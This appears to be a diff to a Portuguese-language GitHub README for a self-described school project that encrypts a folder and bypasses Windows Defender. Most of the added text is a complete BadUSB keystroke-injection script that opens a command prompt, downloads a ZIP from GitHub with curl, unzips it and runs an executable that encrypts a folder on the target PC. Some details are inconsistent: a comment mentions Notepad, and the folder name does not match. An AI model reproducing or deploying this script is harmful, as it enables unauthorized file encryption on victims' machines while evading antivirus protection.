@@ -1,2 +1,41 @@
 # CifrarPastaTrabalhoEscola
 Trabalho escola para cifrar uma pasta
+
+
+rapysberry pi bad usb encrpyt a folder
+PROJETO DESENVOLVIDO POR TELES
+PROJETO DE ESCOLA PARA CIFRAR UMA PASTA que da bypass ao windows defender
+
+
+
+CONTINUACAO DO PROJETO E FAZER DOWNLOAD DO FICHEIRO NO GITHUB A USAR UMA BADUSB PARA ELA FAZER O DOWNLOAD E EXECUTAR E CIFRAR UMA PASTA NO PC
+
+
+
+REM Inicia o Notepad
+DELAY 1000
+GUI r
+DELAY 1000
+REM Abre a janela de comando
+STRING cmd
+ENTER
+DELAY 1000
+REM Vai para a pasta de downloads
+STRING cd downloads
+ENTER
+DELAY 1000
+REM Faz o download do arquivo ZIP
+STRING curl -LJO https://github.com/PEQSPC/rapysberry-pi-BADUSB-ENCRYPTFOLDER/archive/refs/heads/main.zip
+ENTER
+DELAY 5000
+REM Descompacta o arquivo ZIP
+STRING unzip rapysberry-pi-BADUSB-ENCRYPTFOLDER-main.zip
+ENTER
+DELAY 1000
+REM Vai para a pasta descompactada
+STRING cd repo-master
+ENTER
+DELAY 1000
+REM Executa o arquivo dentro da pasta
+STRING cifrarumapasta.exe
+ENTER
